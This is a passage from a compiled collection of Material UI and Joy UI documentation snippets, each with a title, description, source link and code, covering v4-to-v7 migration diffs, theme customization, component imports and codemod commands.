https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_13\n\nLANGUAGE: diff\nCODE:\n```\n  <Dialog\n-  onEnter={onEnter}\n-  onEntered={onEntered}\n-  onEntering={onEntering}\n-  onExit={onExit}\n-  onExited={onExited}\n-  onExiting={onExiting}\n+  TransitionProps={{\n+    onEnter,\n+    onEntered,\n+    onEntering,\n+    onExit,\n+    onExited,\n+    onExiting,\n+  }}\n  >\n```\n\n----------------------------------------\n\nTITLE: Enabling CSS Theme Variables in Material UI Theme\nDESCRIPTION: Diff showing how to enable CSS theme variables in a Material UI theme for use with Next.js.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n 'use client';\n const theme = createTheme({\n+  cssVariables: true,\n });\n```\n\n----------------------------------------\n\nTITLE: Implementing Page Container with Breadcrumbs in Toolpad\nDESCRIPTION: Shows how to use the PageContainer component from @toolpad/core, which includes built-in support for breadcrumbs, page title, and actions in a dashboard layout.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_8\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"PageContainerBasic.js\", \"height\": 400, \"bg\": \"inline\", \"defaultExpanded\": false}\n```\n\n----------------------------------------\n\nTITLE: Updating ToggleButton import in React\nDESCRIPTION: Moves the ToggleButton and ToggleButtonGroup components from lab to core as they are now stable.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_43\n\nLANGUAGE: diff\nCODE:\n```\n-import ToggleButton from '@mui/lab/ToggleButton';\n-import ToggleButtonGroup from '@mui/lab/ToggleButtonGroup';\n+import ToggleButton from '@mui/material/ToggleButton';\n+import ToggleButtonGroup from '@mui/material/ToggleButtonGroup';\n```\n\n----------------------------------------\n\nTITLE: Using Custom Color Values with Joy UI Components\nDESCRIPTION: Demonstrates how to use custom color values with Joy UI components after defining them in the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<Button color=\"secondary\">Secondary color</Button>\n<Button color=\"tertiary\">Tertiary color</Button>\n```\n\n----------------------------------------\n\nTITLE: Importing Basic List Components (JavaScript/React)\nDESCRIPTION: Shows the import statements for the fundamental List and ListItem components from Material UI. These are the building blocks for creating basic lists in React applications.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/lists/lists.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport List from '@mui/material/List';\nimport ListItem from '@mui/material/ListItem';\n```\n\n----------------------------------------\n\nTITLE: TypeScript type augmentation for removing typography levels in Joy UI\nDESCRIPTION: Example of how to augment TypeScript types to exclude default typography levels from the theme structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-typography/theme-typography.md#2025-04-22_snippet_5\n\nLANGUAGE: ts\nCODE:\n```\n// You can put this to any file that's included in your tsconfig\ndeclare module '@mui/joy/styles' {\n  interface TypographySystemOverrides {\n    'title-sm': false;\n    'title-xs': false;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Component Classes Constants for Nested Selectors\nDESCRIPTION: Example showing how to use exported component classes constants instead of hardcoding class names when migrating theme styleOverrides to Emotion.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n+import { outlinedInputClasses } from '@mui/material/OutlinedInput';\n\n const theme = createTheme({\n   components: {\n     MuiOutlinedInput: {\n       styleOverrides: {\n         root: {\n-          '& $notchedOutline': {\n+          [`& .${outlinedInputClasses.notchedOutline}`]: {\n             borderWidth: 1,\n           }\n         }\n       }\n     }\n   }\n });\n```\n\n----------------------------------------\n\nTITLE: Handling Text Overflow in Material-UI\nDESCRIPTION: Examples of textOverflow property usage to control how text behaves when it exceeds its container. This demonstrates clipping text or showing ellipsis when text overflows.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n<Box component=\"div\" sx={{ textOverflow: 'clip' }}>\n  Lorem Ipsum is simply dummy text\n</Box>\n<Box component=\"div\" sx={{ textOverflow: 'ellipsis' }}>\n  Lorem Ipsum is simply dummy text\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Enabling CSS Theme Variables\nDESCRIPTION: Configuration for enabling CSS theme variables in Material UI theme setup.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_19\n\nLANGUAGE: diff\nCODE:\n```\n 'use client';\n const theme = createTheme({\n+  cssVariables: true,\n });\n```\n\n----------------------------------------\n\nTITLE: Migrating Badge Component Props in JSX\nDESCRIPTION: Shows how to migrate Badge component props from the deprecated 'components/componentsProps' pattern to the newer 'slots/slotProps' approach in JSX code.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n <Badge\n-  components={{ Root: CustomRoot }}\n-  componentsProps={{ root: { testid: 'test-id' } }}\n+  slots={{ root: CustomRoot }}\n+  slotProps={{ root: { testid: 'test-id' } }}\n />\n```\n\n----------------------------------------\n\nTITLE: Customizing Default Shadow in Joy UI\nDESCRIPTION: Shows how to override the default shadow tokens in the Joy UI theme using the extendTheme function. This snippet demonstrates how to provide custom CSS box-shadow values to the shadow keys.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-shadow/theme-shadow.md#2025-04-22_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  shadow: {\n    xs: '{CSS box-shadow}',\n    sm: '{CSS box-shadow}',\n    md: '{CSS box-shadow}',\n    lg: '{CSS box-shadow}',\n    xl: '{CSS box-shadow}',\n  },\n});\n\n// Then, pass it to `<CssVarsProvider theme={theme}>`.\n```\n\n----------------------------------------\n\nTITLE: Setting Height Percentages with Material-UI Box Component\nDESCRIPTION: Demonstrates how to set various height percentages using the Box component's sx prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/sizing/sizing.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ height: '25%' }}>…\n<Box sx={{ height: '50%' }}>…\n<Box sx={{ height: '75%' }}>…\n<Box sx={{ height: '100%' }}>…\n```\n\n----------------------------------------\n\nTITLE: Underline Behavior Configuration in Material-UI Links\nDESCRIPTION: Shows how to configure the underline behavior of Link components using the underline prop with a default value of 'always'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/links/links.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"UnderlineLink.js\"}\n```\n\n----------------------------------------\n\nTITLE: Fixing Theme-Related Errors with ThemeProvider in Material UI v5\nDESCRIPTION: Demonstrates the correct way to structure components using styles to avoid errors when a component tries to access theme properties outside of a ThemeProvider context.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/troubleshooting.md#2025-04-22_snippet_7\n\nLANGUAGE: js\nCODE:\n```\nfunction AppContent(props) {\n  const classes = useStyles(); // ✅ This is safe because it is called inside ThemeProvider\n  return <Card className={classes.root}>...</Card>;\n}\n\nfunction App(props) {\n  return (\n    <ThemeProvider theme={theme}>\n      <CssBaseline />\n      <AppContent {...props} />\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Opting Out of RTL for Specific Components\nDESCRIPTION: Use the /* @noflip */ directive in styled components to prevent specific CSS properties from being flipped in RTL mode.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/right-to-left/right-to-left.md#2025-04-22_snippet_7\n\nLANGUAGE: js\nCODE:\n```\nconst LeftToRightTextInRtlApp = styled('div')`\n  /* @noflip */\n  text-align: left;\n`;\n```\n\n----------------------------------------\n\nTITLE: Running Moved Lab Modules Codemod Command\nDESCRIPTION: Command to execute the moved-lab-modules codemod on a specified path. This updates imports for @material-ui/lab components that have moved to @material-ui/core.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_101\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/moved-lab-modules <path>\n```\n\n----------------------------------------\n\nTITLE: Box Component HTML Structure\nDESCRIPTION: Shows the HTML anatomy of the Box component. The Box renders as a single root div element with the MuiBox-root class name containing its child elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/box/box.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<div className=\"MuiBox-root\">\n  <!-- contents of the Box -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Context Menu Implementation\nDESCRIPTION: Right-click context menu implementation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_11\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"ContextMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Styling Deeper Elements with Global CSS\nDESCRIPTION: Shows how to target nested child elements within Material UI components using the generated class names in global CSS, maintaining the required specificity.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_6\n\nLANGUAGE: CSS\nCODE:\n```\n.MuiSlider-root {\n  color: #20b2aa;\n}\n\n.MuiSlider-root:hover {\n  color: #2e8b57;\n}\n\n.MuiSlider-root .MuiSlider-thumb {\n  border-radius: 1px;\n}\n```\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\nimport './GlobalCssSliderDeep.css';\n\nexport default function GlobalCssSliderDeep() {\n  return <Slider defaultValue={30} />;\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom Size Values with Joy UI Components\nDESCRIPTION: Shows how to use custom size values with Joy UI components after defining them in the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_9\n\nLANGUAGE: jsx\nCODE:\n```\n<Button size=\"xs\">Extra small</Button>\n<Button size=\"xl\">Extra large</Button>\n```\n\n----------------------------------------\n\nTITLE: Setting Background Color using bgcolor Alias with sx Prop in Material UI JSX\nDESCRIPTION: Illustrates using the `bgcolor` alias for `backgroundColor` within the `sx` prop to set the background color from the theme palette (e.g., 'primary.main'). This provides a shorter syntax for a common styling need.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ bgcolor: 'primary.main' }} />\n// equivalent to backgroundColor: theme => theme.palette.primary.main\n```\n\n----------------------------------------\n\nTITLE: Migrating from createMuiTheme to createTheme\nDESCRIPTION: Shows the required import change when migrating from the deprecated createMuiTheme function to the current createTheme function.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n-import { createMuiTheme } from '@mui/material/styles';\n+import { createTheme } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Native Select with Label Implementation\nDESCRIPTION: Shows implementation of native select element with proper label association\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/selects/selects.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n<InputLabel htmlFor=\"select\">Age</InputLabel>\n<NativeSelect id=\"select\">\n  <option value=\"10\">Ten</option>\n  <option value=\"20\">Twenty</option>\n</NativeSelect>\n```\n\n----------------------------------------\n\nTITLE: Configuring Neutral Colors in MUI Joy UI Theme\nDESCRIPTION: Defines neutral color palette and its variants for both light and dark themes, including background colors and common color values. Includes various component states and text colors.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst neutral = {\n  50: '#F7F7F8',\n  100: '#EBEBEF',\n  200: '#D8D8DF',\n  300: '#B9B9C6',\n  400: '#8F8FA3',\n  500: '#73738C',\n  600: '#5A5A72',\n  700: '#434356',\n  800: '#25252D',\n  900: '#131318',\n};\n\nextendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        neutral: {\n          ...neutral,\n          plainColor: `var(--joy-palette-neutral-800)`,\n          plainHoverColor: `var(--joy-palette-neutral-900)`,\n          plainHoverBg: `var(--joy-palette-neutral-100)`,\n          plainActiveBg: `var(--joy-palette-neutral-200)`,\n          plainDisabledColor: `var(--joy-palette-neutral-300)`,\n\n          outlinedColor: `var(--joy-palette-neutral-800)`,\n          outlinedBorder: `var(--joy-palette-neutral-200)`,\n          outlinedHoverColor: `var(--joy-palette-neutral-900)`,\n          outlinedHoverBg: `var(--joy-palette-neutral-100)`,\n          outlinedHoverBorder: `var(--joy-palette-neutral-300)`,\n          outlinedActiveBg: `var(--joy-palette-neutral-200)`,\n          outlinedDisabledColor: `var(--joy-palette-neutral-300)`,\n          outlinedDisabledBorder: `var(--joy-palette-neutral-100)`,\n\n          softColor: `var(--joy-palette-neutral-800)`,\n          softBg: `var(--joy-palette-neutral-100)`,\n          softHoverColor: `var(--joy-palette-neutral-900)`,\n          softHoverBg: `var(--joy-palette-neutral-200)`,\n          softActiveBg: `var(--joy-palette-neutral-300)`,\n          softDisabledColor: `var(--joy-palette-neutral-300)`,\n          softDisabledBg: `var(--joy-palette-neutral-50)`,\n          solidColor: `var(--joy-palette-common-white)`,\n          solidBg: `var(--joy-palette-neutral-600)`,\n          solidHoverBg: `var(--joy-palette-neutral-700)`,\n          solidActiveBg: `var(--joy-palette-neutral-800)`,\n          solidDisabledColor: `var(--joy-palette-neutral-300)`,\n          solidDisabledBg: `var(--joy-palette-neutral-50)`,\n        },\n        common: {\n          white: '#FFF',\n          black: '#09090D',\n        },\n        text: {\n          secondary: 'var(--joy-palette-neutral-600)',\n          tertiary: 'var(--joy-palette-neutral-500)',\n        },\n        background: {\n          body: 'var(--joy-palette-common-white)',\n          tooltip: 'var(--joy-palette-neutral-800)',\n          backdrop: 'rgba(255 255 255 / 0.5)',\n        },\n      },\n    },\n    dark: {\n      palette: {\n        neutral: {\n          ...neutral,\n          plainColor: `var(--joy-palette-neutral-200)`,\n          plainHoverColor: `var(--joy-palette-neutral-50)`,\n          plainHoverBg: `var(--joy-palette-neutral-800)`,\n          plainActiveBg: `var(--joy-palette-neutral-700)`,\n          plainDisabledColor: `var(--joy-palette-neutral-700)`,\n\n          outlinedColor: `var(--joy-palette-neutral-200)`,\n          outlinedBorder: `var(--joy-palette-neutral-800)`,\n          outlinedHoverColor: `var(--joy-palette-neutral-50)`,\n          outlinedHoverBg: `var(--joy-palette-neutral-800)`,\n          outlinedHoverBorder: `var(--joy-palette-neutral-700)`,\n          outlinedActiveBg: `var(--joy-palette-neutral-800)`,\n          outlinedDisabledColor: `var(--joy-palette-neutral-800)`,\n          outlinedDisabledBorder: `var(--joy-palette-neutral-800)`,\n\n          softColor: `var(--joy-palette-neutral-200)`,\n          softBg: `var(--joy-palette-neutral-800)`,\n          softHoverColor: `var(--joy-palette-neutral-50)`,\n          softHoverBg: `var(--joy-palette-neutral-700)`,\n          softActiveBg: `var(--joy-palette-neutral-600)`,\n          softDisabledColor: `var(--joy-palette-neutral-700)`,\n          softDisabledBg: `var(--joy-palette-neutral-900)`,\n\n          solidColor: `var(--joy-palette-common-white)`,\n          solidBg: `var(--joy-palette-neutral-600)`,\n          solidHoverBg: `var(--joy-palette-neutral-700)`,\n          solidActiveBg: `var(--joy-palette-neutral-800)`,\n          solidDisabledColor: `var(--joy-palette-neutral-700)`,\n          solidDisabledBg: `var(--joy-palette-neutral-900)`,\n        },\n        common: {\n          white: '#FFF',\n          black: '#09090D',\n        },\n        background: {\n          body: 'var(--joy-palette-neutral-900)',\n          surface: 'var(--joy-palette-common-black)',\n          popup: 'var(--joy-palette-neutral-900)',\n          level1: 'var(--joy-palette-neutral-800)',\n          level2: 'var(--joy-palette-neutral-700)',\n          level3: 'var(--joy-palette-neutral-600)',\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Modifying Error Message Logic Conditionally - TypeScript\nDESCRIPTION: Conditionally assembles expected error messages based on the React major version during tests. This snippet uses the `reactMajor` value (from `@mui/internal-test-utils`) to determine which error message structure is expected given differing error handling between React 18 and 19. It is designed for use in test code that compares actual errors against expected arrays or strings. Dependencies: TypeScript, React, `@mui/internal-test-utils`. Parameters: error message strings, `reactMajor`. Returns: either an array of strings or a concatenated string, depending on the React version.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/react-19-update.md#2025-04-22_snippet_0\n\nLANGUAGE: ts\nCODE:\n```\nconst errorMessage1 = 'MUI\\u00A0X: Could not find the animation ref context.';\nconst errorMessage2 =\n  'It looks like you rendered your component outside of a ChartsContainer parent component.';\nconst errorMessage3 =\n  'The above error occurred in the <UseSkipAnimation> component:';\nconst expectedError =\n  reactMajor < 19\n    ? [errorMessage1, errorMessage2, errorMessage3]\n    : `${errorMessage1}\\n${errorMessage2}`;\n```\n\n----------------------------------------\n\nTITLE: Styling Sheet Component with sx Prop\nDESCRIPTION: Demonstrates styling the Sheet component using the sx prop with flexbox and spacing properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/tutorial/tutorial.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Sheet\n  sx={{\n    width: 300,\n    mx: 'auto', // margin left & right\n    my: 4, // margin top & bottom\n    py: 3, // padding top & bottom\n    px: 2, // padding left & right\n    display: 'flex',\n    flexDirection: 'column',\n    gap: 2,\n    borderRadius: 'sm',\n    boxShadow: 'md',\n  }}\n>\n  Welcome!\n</Sheet>\n```\n\n----------------------------------------\n\nTITLE: Creating Reusable Styles with Object Syntax\nDESCRIPTION: Example of creating reusable styles using Pigment CSS object syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst mainClass = css({\n  display: '#000',\n  color: '#fff',\n});\n```\n\n----------------------------------------\n\nTITLE: RadioGroup Component HTML Structure\nDESCRIPTION: The HTML structure of a RadioGroup component showing the root div element that wraps multiple Radio components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/radio-button/radio-button.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiRadioGroup-root\">\n  <!-- Radio components here -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Creating Slider with Inverted Track in React\nDESCRIPTION: Shows how to implement a slider with an inverted track by setting the 'track' prop to 'inverted' in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_16\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"TrackInvertedSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Manual Migration from TextField to Input Component in React\nDESCRIPTION: Example showing how to manually replace the TextField component with a composition of FormControl, FormLabel, FormHelperText, and Input components while preserving all props and functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/text-field/text-field.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n-import TextField from '@mui/joy/TextField';\n+import FormControl from '@mui/joy/FormControl';\n+import FormLabel from '@mui/joy/FormLabel';\n+import FormHelperText from '@mui/joy/FormHelperText';\n+import Input from '@mui/joy/Input';\n\n-<TextField\n-  id=\"Id\"\n-  label=\"Label\"\n-  placeholder=\"Placeholder\"\n-  helperText=\"Help!\"\n-  name=\"Name\"\n-  type=\"tel\"\n-  autoComplete=\"on\"\n-  autoFocus\n-  error\n-  required\n-  fullWidth\n-  defaultValue=\"DefaultValue\"\n-  size=\"sm\"\n-  color=\"primary\"\n-  variant=\"outlined\"\n-/>\n+<FormControl\n+  id=\"Id\"\n+  required\n+  size=\"sm\"\n+  color=\"primary\">\n+  <FormLabel>\n+    Label\n+  </FormLabel>\n+  <Input\n+    placeholder=\"Placeholder\"\n+    name=\"Name\"\n+    type=\"tel\"\n+    autoComplete=\"on\"\n+    autoFocus\n+    error\n+    fullWidth\n+    defaultValue=\"DefaultValue\"\n+    variant=\"outlined\" />\n+  <FormHelperText>\n+    Help!\n+  </FormHelperText>\n+</FormControl>\n```\n\n----------------------------------------\n\nTITLE: Select Theme Customization\nDESCRIPTION: Configuration for customizing the Select component's indicator through theme settings.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/select/select.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport { extendTheme, CssVarsProvider } from '@mui/joy/styles';\nimport Select from '@mui/joy/Select';\n\nconst theme = extendTheme({\n  components: {\n    JoySelect: {\n      defaultProps: {\n        indicator: '↕',\n      },\n    },\n  },\n});\n\nconst App = () => (\n  <CssVarsProvider theme={theme}>\n    <Select>...options</Select>\n  </CssVarsProvider>\n);\n```\n\n----------------------------------------\n\nTITLE: Migrating from ListItem Button Prop to ListItemButton Component in React\nDESCRIPTION: Updates to replace the deprecated 'button' prop in ListItem with the dedicated ListItemButton component in Material UI v6.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_13\n\nLANGUAGE: diff\nCODE:\n```\n-<ListItem button />\n+<ListItemButton />\n```\n\n----------------------------------------\n\nTITLE: Updated Provider Implementation\nDESCRIPTION: Example of the new LocalizationProvider implementation with date adapter.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/pickers-migration/pickers-migration.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport AdapterDateFns from '@mui/lab/AdapterDateFns';\nimport LocalizationProvider from '@mui/lab/LocalizationProvider';\n\n\nfunction App() {\n  return (\n    <LocalizationProvider dateAdapter={AdapterDateFns}>\n      ...\n    </LocalizationProvider>\n  )\n);\n```\n\n----------------------------------------\n\nTITLE: Using Avatar Variants in React\nDESCRIPTION: Shows how to create square or rounded avatars using the 'variant' prop on the Avatar component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"VariantAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Running Pigment CSS Next.js Demo App in Development Mode\nDESCRIPTION: This command uses pnpm and nx to run the Pigment CSS Next.js demo app in development mode for active development and testing.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/README.md#2025-04-22_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\npnpm nx run @app/pigment-css-next-app:dev\n```\n\n----------------------------------------\n\nTITLE: TypeScript Styled Component Props\nDESCRIPTION: TypeScript interface definition for extending component props with styled utility\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/how-to-customize/how-to-customize.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\nimport * as React from 'react';\nimport { styled } from '@mui/material/styles';\nimport Slider, { SliderProps } from '@mui/material/Slider';\n\ninterface StyledSliderProps extends SliderProps {\n  success?: boolean;\n}\n\nconst StyledSlider = styled(Slider, {\n  shouldForwardProp: (prop) => prop !== 'success',\n})<StyledSliderProps>(({ success, theme }) => ({\n  ...(success &&\n    {\n      // the overrides added when the new prop is used\n    }),\n}));\n```\n\n----------------------------------------\n\nTITLE: Aligning Table Cells in Joy UI\nDESCRIPTION: This snippet shows how to align table cells using the sx prop and CSS selectors in a Joy UI Table.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/table/table.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Table sx={{ '& tr > *:not(:first-child)': { textAlign: 'right' } }}>\n```\n\n----------------------------------------\n\nTITLE: Defining Styled Components with emotion/styled-components in JSX\nDESCRIPTION: Demonstrates how to create styled components using the `styled()` API, which is the core styling primitive in MUI Core v5. This example shows creating a `div` with red text color using both the object syntax and the tagged template literal syntax, compatible with libraries like emotion and styled-components. This API replaces the older `makeStyles` from v4.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nconst StyledDiv = styled('div')({\n  color: 'red',\n});\n\n// or\nconst StyledDiv = styled.div`\n  color: red;\n`;\n```\n\n----------------------------------------\n\nTITLE: Implementing Persistent Tooltips for Speed Dial Actions in React\nDESCRIPTION: Shows how to display persistent tooltips for SpeedDialActions, useful for touch devices or enhanced user experience.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/speed-dial/speed-dial.md#2025-04-22_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"SpeedDialTooltipOpen.js\"}\n```\n\n----------------------------------------\n\nTITLE: Importing Material UI Component Modules\nDESCRIPTION: Component import declarations showing the modular structure of Material UI, organized by functional categories including inputs, data display, feedback, surface, navigation, layout, lab, and utilities.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/all-components/all-components.md#2025-04-22_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n\"component\": \"modules/components/MaterialUIComponents/MaterialInputComponents.js\"\n```\n\nLANGUAGE: js\nCODE:\n```\n\"component\": \"modules/components/MaterialUIComponents/MaterialDataDisplayComponents.js\"\n```\n\nLANGUAGE: js\nCODE:\n```\n\"component\": \"modules/components/MaterialUIComponents/MaterialFeedbackComponents.js\"\n```\n\nLANGUAGE: js\nCODE:\n```\n\"component\": \"modules/components/MaterialUIComponents/MaterialSurfaceComponents.js\"\n```\n\nLANGUAGE: js\nCODE:\n```\n\"component\": \"modules/components/MaterialUIComponents/MaterialNavigationComponents.js\"\n```\n\nLANGUAGE: js\nCODE:\n```\n\"component\": \"modules/components/MaterialUIComponents/MaterialLayoutComponents.js\"\n```\n\nLANGUAGE: js\nCODE:\n```\n\"component\": \"modules/components/MaterialUIComponents/MaterialLabComponents.js\"\n```\n\nLANGUAGE: js\nCODE:\n```\n\"component\": \"modules/components/MaterialUIComponents/MaterialUtilComponents.js\"\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic react-admin Interface (JSX)\nDESCRIPTION: This snippet shows a basic setup for a `react-admin` application. It uses the `Admin` component as a provider, configures a `simpleRestProvider` for data fetching, and defines a 'users' resource using `ListGuesser` to automatically display the data list. This illustrates the subcomponent composition approach favored by react-admin.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/making-customizable-components.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { Admin, Resource, ListGuesser } from 'react-admin';\nimport simpleRestProvider from 'ra-data-simple-rest';\n\nconst dataProvider = simpleRestProvider('https://domain.tld/api');\n\nexport default function App() {\n  return (\n    <Admin dataProvider={dataProvider}>\n      <Resource name=\"users\" list={ListGuesser} />\n    </Admin>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Colored Timeline in React\nDESCRIPTION: Shows how to use different colors from the theme palette for TimelineDot components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"ColorsTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating Button CSS Class Selectors\nDESCRIPTION: Shows how to update deprecated Button CSS class selectors with the new separate variant and color class pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n-.MuiButton-textInherit\n+.MuiButton-text.MuiButton-colorInherit\n-.MuiButton-textPrimary\n+.MuiButton-text.MuiButton-colorPrimary\n-.MuiButton-textSecondary\n+.MuiButton-text.MuiButton-colorSecondary\n-.MuiButton-textSuccess\n+.MuiButton-text.MuiButton-colorSuccess\n-.MuiButton-textError\n+.MuiButton-text.MuiButton-colorError\n-.MuiButton-textInfo\n+.MuiButton-text.MuiButton-colorInfo\n-.MuiButton-textWarning\n+.MuiButton-text.MuiButton-colorWarning\n-.MuiButton-outlinedInherit\n+.MuiButton-outlined.MuiButton-colorInherit\n-.MuiButton-outlinedPrimary\n+.MuiButton-outlined.MuiButton-colorPrimary\n-.MuiButton-outlinedSecondary\n+.MuiButton-outlined.MuiButton-colorSecondary\n-.MuiButton-outlinedSuccess\n+.MuiButton-outlined.MuiButton-colorSuccess\n-.MuiButton-outlinedError\n+.MuiButton-outlined.MuiButton-colorError\n-.MuiButton-outlinedInfo\n+.MuiButton-outlined.MuiButton-colorInfo\n-.MuiButton-outlinedWarning\n+.MuiButton-outlined.MuiButton-colorWarning\n-.MuiButton-containedInherit\n+.MuiButton-contained.MuiButton-colorInherit\n-.MuiButton-containedPrimary\n+.MuiButton-contained.MuiButton-colorPrimary\n-.MuiButton-containedSecondary\n+.MuiButton-contained.MuiButton-colorSecondary\n-.MuiButton-containedSuccess\n+.MuiButton-contained.MuiButton-colorSuccess\n-.MuiButton-containedError\n+.MuiButton-contained.MuiButton-colorError\n-.MuiButton-containedInfo\n+.MuiButton-contained.MuiButton-